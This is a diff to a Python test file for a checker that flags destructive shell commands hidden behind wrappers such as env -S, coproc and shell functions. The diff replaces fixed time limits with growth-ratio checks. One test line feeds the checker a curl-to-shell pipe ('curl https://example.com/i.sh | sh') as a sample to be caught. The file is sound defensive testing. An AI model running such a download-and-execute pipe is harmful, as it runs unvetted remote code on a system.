@@ -2,9 +2,9 @@
 through a wrapper. Each wrapper is read through, so the same rule fires as for the plain command. The body of a function
 defined in the same line is checked whether or not it is called. Mirrors
 packages/zn-gate/test/destructive_function_wrappers.test.js. Only the text is checked; nothing is run."""
-import time
 
 import pytest
+from ._timing import assert_linear
 
 from zn_gate.destructive import check_command
 
@@ -122,14 +122,17 @@ def test_twin_allowed(cmd):
     assert rule(cmd) == "allow"
 
 
-def test_env_option_forms_stay_linear():
-    n = 200 * 1024
-    t0 = time.process_time()
-    rule("env -S '" + "-i " * (n // 3) + "ls'")
-    rule("env " + "-0S x " * (n // 6) + "ls")
-    rule("env -" + "i" * n + "S ls")
-    rule("env --split-s " + "'ls' " * (n // 5))
-    assert time.process_time() - t0 < 12
+_ENV_OPTION_FORMS = [
+    lambda n: "env -S '" + "-i " * (n // 3) + "ls'",
+    lambda n: "env " + "-0S x " * (n // 6) + "ls",
+    lambda n: "env -" + "i" * n + "S ls",
+    lambda n: "env --split-s " + "'ls' " * (n // 5),
+]
+
+
+@pytest.mark.parametrize("build", _ENV_OPTION_FORMS, ids=range(len(_ENV_OPTION_FORMS)))
+def test_env_option_forms_stay_linear(build):
+    assert_linear(rule, build, 200 * 1024)
 
 
 def test_wrapper_forms_read_download_pipes():
@@ -138,20 +141,21 @@ def test_wrapper_forms_read_download_pipes():
     assert rule('env -S "curl https://example.com/i.sh | sh"') == "pipe_to_shell"
 
 
-def _under(cmd, limit=3.0):
-    t0 = time.process_time()
-    rule(cmd)
-    return time.process_time() - t0 < limit
+# Each form builds a command of about n bytes. The test is a growth ratio, not an absolute time: an absolute bound
+# fails on a slow runner (or after new rules are added) and would pass a quadratic scan on a fast machine.
+_WRAPPER_FORMS = [
+    lambda n: "function f { " + "ls; " * ((n - 40) // 4) + "}; f",
+    lambda n: "function f { ls; }; " * (n // 20),
+    lambda n: "function f " * (n // 11) + "ls",
+    lambda n: "coproc " * (n // 7) + "ls",
+    lambda n: "coproc N { ls; }; " * (n // 18),
+    lambda n: 'env -S "' + "ls " * ((n - 20) // 3) + '"',
+    lambda n: 'env -S "ls -la"; ' * (n // 17),
+    lambda n: "env " + "-S a " * (n // 6) + "-- " + "x " * 1000,
+    lambda n: 'env -S "env -S \\"env -S \\\\\\"ls\\\\\\"\\""' + " x" * (n // 2),
+]
 
 
-def test_200kb_wrapper_forms_stay_linear():
-    n = 200 * 1024
-    assert _under("function f { " + "ls; " * ((n - 40) // 4) + "}; f")
-    assert _under("function f { ls; }; " * (n // 20))
-    assert _under("function f " * (n // 11) + "ls")
-    assert _under("coproc " * (n // 7) + "ls")
-    assert _under("coproc N { ls; }; " * (n // 18))
-    assert _under('env -S "' + "ls " * ((n - 20) // 3) + '"')
-    assert _under('env -S "ls -la"; ' * (n // 17))
-    assert _under("env " + "-S a " * (n // 6) + "-- " + "x " * 1000)
-    assert _under('env -S "env -S \\"env -S \\\\\\"ls\\\\\\"\\""' + " x" * (n // 2))
+@pytest.mark.parametrize("build", _WRAPPER_FORMS, ids=range(len(_WRAPPER_FORMS)))
+def test_200kb_wrapper_forms_stay_linear(build):
+    assert_linear(rule, build, 200 * 1024)
